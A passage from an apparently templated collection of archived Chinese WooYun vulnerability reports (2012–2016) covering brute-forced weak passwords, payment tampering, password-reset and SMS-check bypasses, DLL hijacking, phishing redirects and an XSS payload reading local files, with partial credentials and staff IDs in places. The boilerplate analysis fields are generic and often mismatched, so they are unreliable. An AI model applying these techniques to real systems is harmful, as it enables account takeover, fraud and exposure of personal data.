**详情**: 希望此次劳动成果能够被适当尊重！思路与之前公布的漏洞是一样的，启发式查杀和主动防御在不同的两个逻辑层面进行系统防护，但都依靠对恶意软件的恶意行为来进行查杀，如果恶意行为被分散在不同的逻辑层面上，将会令这两大防御功能同时失效。不知道这样写是不是没表达清楚这个漏洞的本质，重点在于“恶意行为的分散”这句话上面。我们所建立的查杀模型大多都是基于一个独立进程，但黑客完全可以把一些恶意行为分散在不同进程中，这样每个进程似乎都是没问题的，组合到一起问题就大了去了！这个问题不仅仅存在于某搜索引擎杀毒身上，大多数杀软都有这个问题。这次的演示程序运行过后将直接停止杀软所有的防护功能，然后为了证明恶意行为可以为所欲为，我特意找到了好久以前的经典木马--灰鸽子。杀软被停掉防护功能后在上面跑灰鸽子没有任何报警或者拦截。方法是这样的，我们首先筛选一些某搜索引擎本身并不会查杀的“可信程序”，这些可信程序具备强大的系统管理功能，例如

**POC**: 这次也不截图了，直接录视频，看的仔细看的透彻！

**绕过**: 直接利用

**修复**: 先加特征码吧，虽然这不用说，连被忽略的漏洞测试程序都给加了特征码了。根源的解决，还是要多关注进程与进程之间互相通信的渠道，建立分析模型。
---

---
### [wooyun-2015-0145555] 中国保信邮箱系统逻辑缺陷已获取员工信息
**厂商**: 中国保险信息技术管理有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: **.**.**.**/ 邮箱地址抓取post信息使用弱口令尝试密码爆破，返回302为成功破解成功登录，获取全部员工联系信息

**POC**: **.**.**.**/ 邮箱地址抓取post信息使用弱口令尝试密码爆破，返回302为成功破解成功登录，获取全部员工联系信息

**绕过**: 直接利用

**修复**: 验证
---

---
### [wooyun-2015-0117315] 康佳某处逻辑漏洞导致用户沦陷（已进入后台）
**厂商**: 康佳集团 | **年份**: 2015 | **类型**: 应用配置错误

**元思考**: 触发信号: 认证接口

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: inurl:KonkaSellUnReport.do?method=list&username=获得https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-083000] 天天团购支付逻辑漏洞导致负值订单
**厂商**: 天天团购 | **年份**: 2014 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 用的是官方程序：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你比我专业
---

---
### [wooyun-2015-0162542] eyougame某分站设计逻辑缺陷（附案例证明）
**厂商**: eyougame.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] 检索到这个子域名 说实话 这个子域名到底干什么的没弄明白 好像是为游戏充值的？我们抓包这里以密码为 123456 为例 丢入 burp 里跑下账号字典账号 密码 匹配正确的 返回状态为 302 错误则为 200（这里我排除了错误状态下的账号）我们随便登录几个账号至主域名 试试 看看正确不正确

**POC**: 以下账号密码均为：123456mask 区域*****da**********4**********123**********le**********em**********he**********od**********at**********03**********hu**********on**********ley**********en**********ri**********us**********ar**********45**********TC**********of**********ma**********ard**********io**********ol*****

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0145180] 南方航空某系统逻辑漏洞导致大量敏感信息泄露（全公司员工手机/邮箱/飞行计划文件/数据监控信息）
**厂商**: 中国南方航空股份有限公司 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.中国南方航空飞行数据应用系统找回密码存在设计缺陷,验证码可猜解爆破抓包爆破4位验证码，admin账户被重置，密码为1111@某IM软件，如下图，重置成功

**POC**: 登陆进去，全公司组织架构，员工信息全部泄露，包括手机，邮箱，工号等等部门事件管理飞行计划文件飞行健康管理可管理内部论坛机组事件内部文件角色管理日志管理数据监控管理

**绕过**: 直接利用

**修复**: 找回密码逻辑要加强
---

---
### [wooyun-2015-0155762] 中华女子学院某功能设计逻辑缺陷泄漏大量信息
**厂商**: 中华女子学院 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标：http://**.**.**.**利用top500 + 123456 可进行爆破zhangjian/123456liuhui/123456zhanglin/123456获取邮箱联系人，生成一份用户字典，再进行爆破（只收集了一小部分）wangxs/123456shimj/123456zhanglun/123456zhangdz/123456huh/123456dail/123456lixs/123456chenqi4/123456mal/123456

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 1.加验证码2.限制尝试次数3.强密码
---

---
### [wooyun-2016-0171407] 哇哈哈某系统设计逻辑缺陷
**厂商**: wahaha.com.cn | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] 下存在大量弱口令用户，大约60多个员工的工资，身份证，电话，职位，学历，姓名等信息泄露53405185719731739884902764185916091623109610695211033189393642339484154197322552595996823317381378904210827469359305290619221929199227513651105213531655961093971049120909619196459722948896149686101227069284以上工号密码为1234562592341以上工号密码为123123285123012431214393602096以上工号密码为111111/ajax/memberCheck.do 爆破工号利用的是这个接口/ajax/memberLogin.do 爆

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 1:增加验证码，防止爆破，我是先通过爆破拿到1000多个工号，然后再爆破密码，其中使用123456的工号高达57个2:提高员工的安全意识，不要使用弱口令
---

---
### [wooyun-2013-024343] 某互联网公司2013检测好友是否隐身的一个方法
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某互联网公司在新版本的某互联网公司中加入了离线发送文件后“撤回”功能。也就是说当文件离线发送成功后可以撤回，这样对方就不收到该文件。但是现在的情况是，如果对方隐身，那么你在点击“撤回”按钮后将提示无法撤回。而对方真正离线则可以退回。这样通过给隐身好友发送离线文件，然后马上点击撤回，就可以根据结果判断对方是否在线。这应该算是一个不是BUG的BUG。但有时真的会造成一定的误会与尴尬。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-080788] 某互联网公司输入法纯净版1.1   存在输入法漏洞
**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修复的话，就是更新输入法就行。
---

---
### [wooyun-2015-0157516] 力诺集团某系统设计逻辑缺陷导致敏感信息泄露
**厂商**: 力诺集团 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞地址：http://**.**.**.**/indishare/office.nsf/(frame)/index即OA系统利用top500 爆破密码为123456的成功拿到一位用户的账号：oa 成功登录：可看到最新的会议通知：个人收件箱：公司3000多人的联系方式，职位

**POC**: 如上

**绕过**: 直接利用

**修复**: 加验证码
---

---
### [wooyun-2014-055822] 360手机助手任意应用下载欺诈安装（二）
**厂商**: 某安全厂商 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 只有安装了360软件 任意浏览器打开下面链接即可zhushou360://type=apk&name=360影视大全&refer=360se&icon=https://example.com/[已脱敏] 和url ico 可以任意修改相比WooYun: 360手机助手任意应用下载欺诈安装此次无确认框  直接加入助手下载的 所以危害还大点

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0121760] 大型p2p公司普资华企存在找回密码逻辑漏洞，导致短信验证被绕过，可直接修改用户登录密码
**厂商**: pccb.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.遍历手机号是否被注册，如图：2.短信验证为前台验证，使用burpsuit抓包得到最后一步修改密码的http包，可直接更改手机号及密码，如图：status：0表示修改成功。手机号和密码可自行更改。

**POC**: 为不影响平台其他用户，只用自己注册的两个用户进行测试。

**绕过**: 直接利用

**修复**: 短信验证码加入后台逻辑
---

---
### [wooyun-2015-096147] 艺龙Android APP敏感信息泄露(泄露用户名、密码等)
**厂商**: 艺龙旅行网 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 艺龙Android客户端（当前版本8.1.0）秘钥管理不当，容易导致用户名、密码等敏感信息泄露。登陆的逻辑：使用org.bouncycastle.crypto里面的AES算法对{"loginNo":"userid","password":"password"}"进行加密，然后对得到的结果做一个编码，最后将编码的后结果发往服务器。其中，AES加密时使用的秘钥是固定的，在Android客户端里面可以很容易得到；后面的编码、解码函数也可以很容易的从Android客户端里抠出来。黑客从Android客户端得到这两个东西之后，就可以从网络流量中直接提取出用户名和明文密码了。

**POC**: 1.使用用户名13406825924，密码qwert123登陆并抓包2.将req=后面字符串（PwgjhTprhSNelLWTjdIa0ViQwyNI9nzJ03aXLs%2BXuS8gbEi2YxfbeEL604YTTJm8）中的%开头的十六进制表示转换成ascii码-》PwgjhTprhSNelLWTjdIa0ViQwyNI9nzJ03aXLs+XuS8gbEi2YxfbeEL604YTTJm83.将PwgjhTprhSNelLWTjdIa0ViQwyNI9nzJ03aXLs+XuS8gbEi2YxfbeEL604YTTJm8调用解码、解密函数，得到用户名和密码的原始信息

**绕过**: 编码绕过

**修复**: 需要重新考虑下秘钥管理的方法。
---

---
### [wooyun-2015-0138749] 同程旅游客户端设计不当可实现钓鱼攻击
**厂商**: 某旅游公司 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 参数注入

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.同程旅游Android客户端组件com.tongcheng.android.TongchengMainUIActivity是导出的2.该组件接受了redirecturl参数，该参数是攻击者可控制的，具体请见测试代码，这里我控制的url以某搜索引擎为例，也可以是任意的钓鱼网站3.通过控制该链接发送钓鱼链接窃取用户隐私信息或账号密码，甚至是某电商平台、网银等密码，由于是在同程客户端打开的，大部分用户会中招的且认为是同程的问题

**POC**: 这里以某搜索引擎为例了，其实可以加载所有的网站，包括做什么事情大家都懂的，在同程一个这样重视钓鱼安全的网站危害我就不具体描述了左右上角绿色的后退按钮和转发按钮同程的同事应该很清楚啦

**绕过**: 直接利用

**修复**: 1.禁止com.tongcheng.android.TongchengMainUIActivity组件的导出
---

---
### [wooyun-2014-054716] 搜房网绕过次数限制实现短信轰炸
**厂商**: 搜房网 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: https://example.com/[已脱敏]

**绕过**: 过滤绕过

**修复**: 过滤
---

---
### [wooyun-2013-039011] 某手机厂商锁屏设计缺陷，可利用后绕过手机安全锁，任意操作用户手机
**厂商**: 某手机厂商 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 后台管理

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 今天在设置了密码锁的时候，发现在锁屏页面，不要去上下左右滑动，而是连续按两下屏幕锁屏的中心点。重复2-3次，就会发现莫名其妙的启动了手机里面的音乐程序（这个是miui自带音乐播放器的界面），然后在按两下锁屏键，就会发现一个似曾相识的界面，没错，就是第三方音乐播放器的锁屏页面，好奇葩的一个设计。（这里需要注意的是，在启动之前是没有任何后台程序在运行的！）然后，后面的事情我就不用在多说了，就可以任意操作用户手机了，方法详见WooYun: 某手机系统安全锁形同虚设（可以绕过后任意操作手机）

**POC**: 漏洞证明视频，包括数字密码锁和图案密码锁状态下的演示。（这里视频只是证明可以在锁屏状态启动第三方音乐播放器，至于后续的利用第三方音乐播放器绕过手机安全锁的视频，请看这个帖子WooYun: 某手机系统安全锁形同虚设（可以绕过后任意操作手机））：密码：wooyun某视频网站地址：https://example.com/[已脱敏] 某手机系统安全锁形同虚设（可以绕过后任意操作手机）更加严重！因为之前的漏洞是需要用户后台有在运行第三方音乐播放器或者第三方锁屏程序的的。而这个漏洞由于某手机厂商的这个比较奇葩的设计，会直接启动第

**绕过**: 过滤绕过

**修复**: 修补：还是做一下权限的判定设计问题吧，将第三方软件的高权限请求拒之门外吧！最后再喊一次，有么有某品牌手机手机？米3F码也可以啊！
---

---
### [wooyun-2012-08679] 某邮箱服务-手机验证存在业务缺陷
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 端午节快乐哈。说明下：这是个bug，不是安全漏洞(如果围观者为了看漏洞，那请移步吧...(^__^))，但关系到用户账号和业务逻辑，加上一个宅男节日无事做，再加上是某互联网公司的铁杆用户，so...提交到wooyun吧。入正题：再次发送手机短信验证码；验证手机时；未将上次所发的验证码销毁。https://example.com/[已脱敏])；

**POC**: 给出了短信验证码只能使用一次的提示多次发送后输入45分的验证码验证成功PS：写的太详细了，有点罗嗦，哈哈。

**绕过**: 直接利用

**修复**: 进入邮箱-账户设置绑定手机处貌似不存在此bug，业务统一一下吧。
---

---
### [wooyun-2012-05874] 某互联网公司业务交叉逻辑考虑不周导致某社交空间CSRF漏洞
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某社交空间支持从邮箱中以邮件的方式发送文章到某社交空间，由于在邮箱中和某社交空间中的业务不同，因此对某些细节的处理不同，而这种交叉，导致在某社交空间中苦苦做的限制白做了。打开某互联网公司的记事本，写一个新的记事，插入一张图片插入后保存，点右上角的发送到Qzone。这一文章便已被发送到了某社交空间。

**POC**: 在他人打开浏览的时候，就会在不知情的情况下，自动访问www.nigesb.com，造成CSRF，某社交空间中，是不允许插入这样的图片链接的。wireshark抓包，证明，确实访问了我的博客。而且某社交空间新发文章，是会出现在好友的动态的timeline中的哟。

**绕过**: 直接利用

**修复**: 这种由于业务交叉导致的问题，我相信不止这一处，由于业务不同，可能需要限制的地方也有不同，一旦两个业务数据打通，而没有进行二次过滤检查的话，很容易出现类似的问题，本问题仅为抛砖引玉，也为求公仔嘿嘿。
---

---
### [wooyun-2013-036675] 迅雷7和迅雷精简版多处DLL劫持（两个迅雷共37处）
**厂商**: 迅雷 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试时迅雷7的默认安装路径为C:\Program Files\Thunder Network\Thunder\Program\迅雷7运行时会加载三处不存在的DLL文件，一处在系统目录下，两处在Thunder.exe主程序同目录下。分别为：c:\windows\system32\dwmapi.dllC:\Program Files\Thunder Network\Thunder\Program\tipscontroller.dllC:\Program Files\Thunder Network\Thunder\Program\ieframe.dll测试时迅雷精简版默认安装路径为C:\Program Files\Thunder Network\MiniThunder\Bin\迅雷精简版运行时ThunderMini.exe会加载34处不存在的DLL文件，场面惊人。如下34处不存在的DLL文件：C

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 哥我还在震精中- -无言，还是那句你们比我懂！
---

---
### [wooyun-2015-0141524] 微品致远某分站功能逻辑缺陷漏洞一枚
**厂商**: 深圳微品致远信息科技有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某品牌商城http://**.**.**.**随便选择一件商品 结算然后进入到提交 订单  直接提交在下一步

**POC**: 确认时候抓包改为0.10 发送请求未进行支付 不知道是否支付成功之后有校验

**绕过**: 直接利用

**修复**: 。。。
---

---
### [wooyun-2015-0138651] 某电商平台某分站严重逻辑缺陷（让任意商品下架）
**厂商**: 江苏某电商平台电子商务有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 站点：https://example.com/[已脱敏]

**POC**: https://example.com/[已脱敏] 1 表示成功 -1表示失败可以遍历页面所有物件id， 然后逐个让他下线 ，是不是 整个站就废了？

**绕过**: 直接利用

**修复**: 权健
---

---
### [wooyun-2015-0130799] 鲜达网某互联网公司水果接龙1元活动存在逻辑缺陷漏洞
**厂商**: 鲜果网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 鲜达网官网https://example.com/[已脱敏]

**POC**: 7、赶紧下订单、支付没有任何阻碍、验证，下单成功！！！本人虽然多得一箱水果，但真的没有恶意，后面一箱水果算是送我了。。。谢谢喽

**绕过**: 编码绕过

**修复**: 不仅做客户端确认，还需要做服务器端确认
---

---
### [wooyun-2015-0140188] 国美在线Android客户端之伪造升级下载恶意应用
**厂商**: 国美控股集团 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.在客户端设置->检测更新，得到下面的服务器返回：2.使用Fiddler截到返回的包，自动解码，将返回数据修改为如下；即：result表示是否更新；upgradeURL表示更新地址；remarks表示更新说明；versionName是版本号。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 后来测试发现，某电商平台除了登陆的时候HTTPS加密传输，其他的几乎都是HTTP传输，返回数据都是简单编码，升级最好对升级的链接啊、apk包啊，进行校验..觉得最最的安全点在于：1.升级的链接为HTTP协议传输，攻击容易；2.返回数据的编码形式..
---

---
### [wooyun-2014-065814] 精心构造BT种子可对某下载工具进行拒绝服务攻击
**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 构造下BT种子，用某下载工具打开直接崩溃，再次打开再次崩溃，屡试不爽~

**POC**: 样本呢本来传到了应急响应中心的，就这里咯~其实我也不知道哪里有逻辑问题啊哈哈哈哈哈顺带提一下，电脑是xpsp3，用了360，哦呵呵呵呵= =https://example.com/[已脱敏] =

**绕过**: 直接利用

**修复**: 哈哈哈哈哈其实我也不会啊，昨天想看AV了就拿个小程序改种子啦哈哈哈哈哈
---

---
### [wooyun-2016-0167386] 豆丁网vip服务支付漏洞
**厂商**: 豆丁网 | **年份**: 2016 | **类型**: 账户体系控制不严

**元思考**: 触发信号: 功能测试

**洞察**: 账户体系控制不严防护不足，开发者信任前端输入

**测试流程**:
1. 识别账户体系控制不严相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.正常的支付流程注册好豆丁网帐号之后 进入开通vip服务：https://example.com/[已脱敏] 点击立即开通选择付款方式 点击确认付款跳转到某电商平台付款页面 支付完成就行2.跳过支付流程以上是正常的支付流程，关键是第2步，选择开通的月份为6个月vip，不要点立即开通这里用到的工具是fiddle  设置f11好拦截数据进行抓包，点击立即开通 确认支付 点击确认之后工具左侧出现拦截的网址数据，双击进去，右侧选项卡选择webforms，只要把vip-type后面的数值（月数）改成大于6以上的数据（小于6未做测试），鼠标点击左栏下方红色箭头两下，释放数据。然后点击右下侧绿色run to ... 网页即可自动跳转到已购买页面，并且显示购买到期时间。

**POC**: 豆丁网https://example.com/[已脱敏] 密码a121212进入vip购买服务fiddle设置好拦截数据 点击确认付款然后修改拦截后的数据 月份为120个月 即为10年然后释放拦截数据再点击run to... 网页直接跳转到https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 1.对所需要购买的支付数据进行加密2.利用公式进行账单结算，在优惠的基础上购买时长越多，产生订单金额越多。3.对所购买的会员服务，不止要对购买所列出的月数产生金额，也要对自定义月数产生订单金额。
---

---
### [wooyun-2015-0148953] 某移动校讯通设计逻辑缺陷可重置用户密码
**厂商**: 某运营商 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通过教师的忘记密码 邮箱找回密码的方式抓包爆破老师名字  然后再通过短信验证修改密码 获取验证码 再抓包就行 泄露大量学生和家长的信息  不法分子可以通过发短信给家长欺骗钱财

**POC**: zhangweiwangweiwangfangliweilinazhangminlijingwangjingliuweiwangxiuyingzhanglilixiuyingwanglizhangjingzhangxiuyingliqiangwangminliminwangleiliuyangwangyanwangyonglijunzhangyonglijiezhangjiezhangleiwangqianglijuanwangjunzhangyanzhangtaowangtaoliyanwangchaolimingliyongwangjuanliujieliuminlixialilizhan

**绕过**: 直接利用

**修复**: 找回密码验证方式加深难度
---

---
### [wooyun-2015-0142542] 到家美食会Android客户之任意手机号注册及其他安全漏洞
**厂商**: daojia.com.cn | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.输入手机号请求注册时，将验证码的CRC32值返回：2.获取用户输入的验证码，进行CRC32校验：然后在本地与服务器返回的CRC码进行对比，相同则注册成功；判断相同了，才想服务器发最后确定注册的封包；3.修改客户端达到任意手机号码的注册：安全预警：1.账号密码储存在本地，还规则分布：加密解密的地方：Lcom/daojia/util/ObscuredSharedPreferences;两个关键KEY，一个是硬编码；一个是手机的android_id属性：2.备份安全：android:allowBackup="true"很明显是没有做过客户端安全方面的评估。

**POC**: (见原文)

**绕过**: 编码绕过

**修复**: 1.本地一定要储存账号和密码才能实现自动登录的话，建议混合式储存；2.android:allowBackup属性设为false；3.短信验证码无论明文密文不要直接返回，更不可在本地做判断；
---

---
### [wooyun-2012-05822] 某邮箱服务日历功能导致IE假死
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 进入某邮箱服务选择日历中的“月”，IE立马卡死。cpu占满。

**POC**: 其他2项正常！在谷歌浏览器和火狐浏览器下正常。

**绕过**: 直接利用

**修复**: 你懂的。
---

---
### [wooyun-2015-0145246] 快的打车某重要系统逻辑漏洞可泄漏大量用户敏感信息包括姓名/车牌号等
**厂商**: 快的打车 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题出在 APP端我测试的是快的司机IOS版首先我注册了一个司机帐号然后登录后 发现有个车队的功能点击车队-加入车队输入4位车队号我随手输入了1111然后抓包POST /taxi/d/js.do?os=ios&osver=9.0&ver=4.0&lat=40.020826&lng=116.536539&city=110105&ts=1444229236532&idx=2934478&token=cb2d6fd999485732b1ce0d7c2f319150&ccode=86&cmd=60006&sign=9c33497682fb3e5c4096ac1cadaa84d4084fad08bbf63d482308 HTTP/1.1Host: c2.kuaidadi.com:80Content-Type: application/jsonConnection: keep-aliveProxy-C

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修改相关逻辑问题
---

---
### [wooyun-2013-038420] 微软BitLocker驱动器加密设计缺陷
**厂商**: 微软 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 可以无需密码直接获取恢复密匙！首先找到加密的磁盘把鼠标放上面右键找到管理BitLocker点击进去可以看到里面有修改密码而且不需要输入原密码

**POC**: 还可以

**绕过**: 直接利用

**修复**: 加上原密码验证！
---

---
### [wooyun-2013-023928] 某互联网公司的某浏览器ios版貌似根本就不验证SSL证书啊
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 如题

**POC**: 在麦当劳wifi未登录时测试，wifi会自动把80的http和443的https劫持到登录页面看见没有...再拿某互联网公司最重视其安全性的tenpay(证书都用的是ev ssl)试一下先在safari里打开点击OK看见没有，连自家支付的安全都不重视了...还某浏览器的安全支持？安全个P

**绕过**: 直接利用

**修复**: 自己想
---

---
### [wooyun-2014-077795] 有道云笔记3.9.5.1版本存在执行任意js脚本漏洞
**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 有道云笔记3.9.5.1版本合并笔记功能会执行笔记标题或者内容中的JS脚本未对其运行机制深入研究目测可以利用

**POC**: 在文章标题中输入<script>alert(1);</script>某些脚本会导致服务端崩溃<script>var fso=new ActiveXObject("Scripting.FileSystemObject");// 打开文件var ts = fso.OpenTextFile("D:/SD/IP换动/1.txt", 1);  //1表示只读//遍历读取while (!ts.AtEndOfStream){s = ts.Readline();alert(s);}ts.Close();</script>

**绕过**: 直接利用

**修复**: 请自行修复
---

---
### [wooyun-2013-017218] 网络电话省钱通设置任意本地接听号码
**厂商**: 网络电话省钱通 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 直接上图吧。在设置处可以设置想要接听的号码。。这是我自己的号码，就不打码了。各位手下留情。。

